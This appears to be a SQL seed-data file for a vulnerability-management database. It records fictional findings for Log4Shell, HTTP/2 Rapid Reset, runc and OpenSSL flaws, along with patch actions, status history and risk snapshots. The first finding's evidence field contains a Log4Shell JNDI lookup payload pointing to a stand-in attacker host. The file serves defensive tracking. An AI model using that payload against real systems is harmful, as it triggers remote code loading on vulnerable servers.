(1,  1,  1, 'Open',          94.25, '2025-12-17', '2025-12-10 08:00:00', '2025-12-10 08:00:00', 'Scanner confirmed JNDI lookup response: ${jndi:ldap://attacker.io/a}', 'Confirmed exploitable — emergency patch required'),
-- mfg-web-prod-01: HTTP/2 Rapid Reset (sw_vuln 4 = apache/http2reset)
(1,  4,  1, 'In Progress',   41.20, '2026-01-14', '2025-12-30 10:00:00', '2025-12-30 10:00:00', 'Load balancer logs show RST_STREAM flood pattern', 'WAF mitigation deployed; full patch pending'),
-- mfg-db-prod-01: OpenSSL Infinite Loop (sw_vuln 2 = openssl/infinite loop)
(3,  2,  1, 'Open',          28.15, '2026-01-25', '2026-01-10 09:00:00', '2026-01-10 09:00:00', 'Nessus plugin 158914 confirmed vulnerable version', 'Scheduled for next maintenance window'),
-- mfg-vpn-gw-01: OpenSSH RCE (sw_vuln 8 = openssh)
(5,  8,  2, 'Open',          55.10, '2026-01-22', '2026-01-07 11:00:00', '2026-01-07 11:00:00', 'CrowdStrike detected ssh-agent anomaly pattern', 'High priority — external facing system'),
-- nbio-ehr-prod-01: Log4Shell
(7,  1,  3, 'Open',         102.50, '2026-01-05', '2025-12-28 08:30:00', '2025-12-28 08:30:00', 'JNDI callback observed on application startup', 'PHI system — HIPAA breach risk — escalated to CISO'),
-- nbio-ehr-prod-01: Spring4Shell (sw_vuln 3 = spring/rce)
(7,  3,  3, 'Remediated',    89.40, '2025-09-15', '2025-09-01 09:00:00', '2025-11-20 14:00:00', 'DataBinder exploitation confirmed in test env', 'Patched to Spring 5.3.18'),
-- nbio-lab-ctrl-01: Windows Server vulnerability (sw_vuln 12 = windows/outlook)
(8,  12, 3, 'Accepted Risk', 45.00, '2025-10-01', '2025-09-15 10:00:00', '2025-09-15 10:00:00', 'Vendor confirmed impact on this model', 'Vendor patch not compatible with GxP validation; compensating control applied'),
-- apex-k8s-master-01: runc Container Escape (sw_vuln 6)
(11, 6,  4, 'Open',          52.30, '2026-01-21', '2026-01-11 07:00:00', '2026-01-11 07:00:00', 'Trivy found runc 1.1.4 in node inventory', 'Multi-tenant risk — immediate remediation required'),
-- apex-k8s-master-01: containerd HTTP/2 (sw_vuln 5)
(11, 5,  4, 'In Progress',   38.70, '2026-01-18', '2025-12-15 06:00:00', '2025-12-15 06:00:00', 'Container runtime version confirmed by agent', 'Rolling update in progress across nodes'),
-- apex-build-01: Log4Shell
(13, 1,  5, 'Open',          72.15, '2026-01-14', '2025-12-20 08:00:00', '2025-12-20 08:00:00', 'Snyk SAST found log4j-core-2.14.1.jar in build classpath', 'Build server compromise could affect CI/CD pipeline integrity'),
-- hrt-pos-server-01: Windows Server (sw_vuln 12)
(15, 12, 6, 'Open',          53.60, '2026-01-21', '2026-01-07 10:00:00', '2026-01-07 10:00:00', 'InsightVM confirmed unpatched Patch Tuesday vulnerability', 'PCI-DSS scope — 30-day breach window'),
-- hrt-ecom-web-01: Apache Request Smuggling (sw_vuln 9)
(16, 9,  6, 'Open',          35.80, '2026-01-22', '2026-01-08 09:00:00', '2026-01-08 09:00:00', 'Burp Suite request smuggling TE:CL variant confirmed', NULL),
-- hrt-ecom-web-01: OpenSSL buffer overflow (sw_vuln 7 = openssl x509)
(16, 7,  6, 'Pending Retest',22.10, '2026-02-07', '2025-11-01 08:00:00', '2025-11-01 08:00:00', 'Plugin 166139 detected vulnerable OpenSSL 3.0.x', 'Patch applied 2025-12-01 — awaiting scanner confirmation'),
-- civ-portal-01: Apache HTTP2 (sw_vuln 4)
(17, 4,  7, 'Open',          30.45, '2026-03-15', '2026-01-05 08:00:00', '2026-01-05 08:00:00', 'HTTP/2 enabled on citizen services portal', 'FISMA High — requires CAB approval for change'),
-- civ-db-prod-01: OpenSSL (sw_vuln 10 = openssl/openssl on third entry)
(18, 2,  7, 'Open',          24.20, '2026-03-30', '2026-01-10 09:00:00', '2026-01-10 09:00:00', 'Nessus confirmed OpenSSL 1.1.1t on database host', 'EOL version — no vendor support');

-- Patch Actions
INSERT INTO patch_actions (finding_id_fk, assigned_to_fk, assigned_by_fk, action_type, status, priority, due_date, started_at, completed_at, change_ticket_id, rollback_plan) VALUES
(1,  2, 1, 'Patch',                   'In Progress',      'Critical','2025-12-17', '2025-12-11 08:00:00', NULL,                    'CHG-2025-4421', 'Rollback to Log4j 2.14.1 and block JNDI via JVM flag'),
(2,  3, 1, 'Configuration Change',    'Completed',        'High',    '2026-01-14', '2025-12-31 09:00:00', '2026-01-02 14:00:00',   'CHG-2025-4498', NULL),
(3,  2, 1, 'Patch',                   'Pending',          'High',    '2026-01-25', NULL,                   NULL,                    'CHG-2026-0041', 'Restore OpenSSL 1.1.1t from package cache'),
(4,  2, 1, 'Patch',                   'In Progress',      'Critical','2026-01-22', '2026-01-08 07:00:00', NULL,                    'CHG-2026-0055', 'Revert to OpenSSH 8.9p1 if regression detected'),
(5,  6, 5, 'Patch',                   'In Progress',      'Critical','2026-01-05', '2025-12-29 06:00:00', NULL,                    'CHG-2025-4490', 'Emergency rollback procedure documented in runbook-nbio-042'),
(6,  7, 5, 'Patch',                   'Completed',        'Critical','2025-09-15', '2025-09-05 09:00:00', '2025-09-10 16:00:00',   'CHG-2025-3101', NULL),
(7,  7, 5, 'Accept Risk',             'Completed',        'High',    NULL,         '2025-09-16 10:00:00', '2025-09-20 11:00:00',   NULL,            NULL),
(8,  9, 8, 'Patch',                   'In Progress',      'Critical','2026-01-21', '2026-01-12 06:00:00', NULL,                    'CHG-2026-0063', 'kubectl rollout undo deployment/runc-update if nodes fail health check'),
(9,  10,8, 'Patch',                   'In Progress',      'High',    '2026-01-18', '2025-12-16 07:00:00', NULL,                    'CHG-2025-4450', 'Rolling restart with previous containerd version'),
(10, 10,8, 'Patch',                   'Pending',          'Critical','2026-01-14', NULL,                   NULL,                    'CHG-2026-0058', NULL),
(11, 12,11,'Patch',                   'Pending',          'Critical','2026-01-21', NULL,                   NULL,                    'CHG-2026-0070', 'Standard Windows rollback via System Restore'),
(12, 12,11,'Workaround',              'In Progress',      'High',    '2026-01-22', '2026-01-09 10:00:00', NULL,                    'CHG-2026-0072', NULL),
(13, 12,11,'Patch',                   'Completed',        'Medium',  '2026-02-07', '2025-12-02 08:00:00', '2025-12-05 15:00:00',   'CHG-2025-4410', NULL),
(14, 14,13,'Patch',                   'Awaiting Approval','High',    '2026-03-15', NULL,                   NULL,                    'CHG-2026-0031', 'Apache rollback procedure per FISMA change mgmt policy'),
(15, 14,13,'Patch',                   'Pending',          'Medium',  '2026-03-30', NULL,                   NULL,                    'CHG-2026-0038', NULL);

-- Patch Status History
INSERT INTO patch_status_history (action_id_fk, old_status, new_status, changed_by_fk, changed_at, change_reason, automated) VALUES
(1,  NULL,        'Pending',         1,  '2025-12-11 07:00:00', 'Emergency patch action opened for CVE-2021-44228 on mfg-web-prod-01', FALSE),
(1,  'Pending',   'In Progress',     2,  '2025-12-11 08:00:00', 'Engineer began Log4j patching — testing in staging first',            FALSE),
(2,  NULL,        'Pending',         1,  '2025-12-31 08:00:00', 'Mitigation plan approved via CAB',                                    FALSE),
(2,  'Pending',   'In Progress',     3,  '2025-12-31 09:00:00', 'Nginx config updated to limit RST_STREAM rate',                       FALSE),
(2,  'In Progress','Completed',      3,  '2026-01-02 14:00:00', 'Configuration change deployed and verified by security team',          FALSE),
(3,  NULL,        'Pending',         1,  '2026-01-10 10:00:00', 'Patch action created — scheduled for next maintenance window',         FALSE),
(4,  NULL,        'Pending',         1,  '2026-01-08 06:00:00', 'CSIRT escalated — external VPN gateway critical finding',             FALSE),
(4,  'Pending',   'In Progress',     2,  '2026-01-08 07:00:00', 'Emergency change approved. Patching underway.',                        FALSE),
(5,  NULL,        'Pending',         5,  '2025-12-29 05:00:00', 'CISO-level escalation. Log4Shell on PHI system — HIPAA incident risk', FALSE),
(5,  'Pending',   'In Progress',     6,  '2025-12-29 06:00:00', 'EHR vendor engaged. Patch testing commenced.',                         FALSE),
(6,  NULL,        'Pending',         5,  '2025-09-05 08:00:00', 'Spring4Shell patch action initiated',                                  FALSE),
(6,  'Pending',   'In Progress',     7,  '2025-09-05 09:00:00', 'Spring Framework upgrade to 5.3.18 in progress',                       FALSE),
(6,  'In Progress','Completed',      7,  '2025-09-10 16:00:00', 'Patch verified. Application tested. Closed.',                          FALSE),
(7,  NULL,        'Pending',         5,  '2025-09-16 09:00:00', 'Risk acceptance process initiated for GxP-validated system',           FALSE),
(7,  'Pending',   'In Progress',     7,  '2025-09-16 10:00:00', 'Compensating control documentation in progress',                       FALSE),
(7,  'In Progress','Completed',      5,  '2025-09-20 11:00:00', 'Risk formally accepted. CISO sign-off obtained. Documented.',          FALSE),
(8,  NULL,        'Pending',         8,  '2026-01-12 05:30:00', 'runc container escape — immediate remediation required',               FALSE),
(8,  'Pending',   'In Progress',     9,  '2026-01-12 06:00:00', 'Rolling node upgrade initiated via kubectl drain',                     FALSE),
(9,  NULL,        'Pending',         8,  '2025-12-16 06:00:00', 'Containerd upgrade plan approved',                                     FALSE),
(9,  'Pending',   'In Progress',    10,  '2025-12-16 07:00:00', 'Rolling update across worker nodes',                                   FALSE),
(13, NULL,        'Pending',         11, '2025-12-02 07:30:00', 'OpenSSL patch action — hrt-ecom-web-01',                               FALSE),
(13, 'Pending',   'In Progress',     12, '2025-12-02 08:00:00', 'Applying OpenSSL update package',                                      FALSE),
(13, 'In Progress','Completed',      12, '2025-12-05 15:00:00', 'Package updated. Rescan scheduled.',                                   FALSE);

-- Risk Score Snapshots (historical trend data)
INSERT INTO risk_score_snapshots (asset_id_fk, snapshot_date, composite_score, open_findings_count, critical_count, high_count, medium_count, low_count, exploit_active_count, sla_breached_count) VALUES
(1,  '2025-12-01',  0.00, 0, 0, 0, 0, 0, 0, 0),
(1,  '2025-12-10', 94.25, 1, 1, 0, 0, 0, 1, 0),
(1,  '2026-01-01',135.45, 2, 1, 1, 0, 0, 1, 1),
(3,  '2025-12-01',  0.00, 0, 0, 0, 0, 0, 0, 0),
(3,  '2026-01-10', 28.15, 1, 0, 1, 0, 0, 0, 0),
(7,  '2025-11-01',  0.00, 0, 0, 0, 0, 0, 0, 0),
(7,  '2025-12-28',102.50, 1, 1, 0, 0, 0, 1, 1),
(11, '2025-12-01',  0.00, 0, 0, 0, 0, 0, 0, 0),
(11, '2025-12-15', 38.70, 1, 0, 1, 0, 0, 0, 0),
(11, '2026-01-11', 91.00, 2, 0, 2, 0, 0, 1, 1);
